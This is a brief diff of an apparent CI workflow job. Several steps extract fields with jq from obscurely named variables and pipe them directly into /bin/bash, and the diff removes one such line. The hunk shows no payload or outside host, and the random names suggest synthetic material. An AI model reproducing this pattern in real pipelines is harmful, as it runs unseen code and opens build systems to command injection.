@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$rjwam135" | jq -r .u41673 | /bin/bash
           printf '%s' "$fc3884" | jq -r .cbca232 | /bin/bash
           echo $ygpoh2 | jq -r .sg82 | /bin/bash
-          printf '%s' "$bf980" | jq -r .lmprq4 | /bin/bash
           printf '%s' "$e93277" | jq -r .qo2 | /bin/bash
 
       - name: Archive output
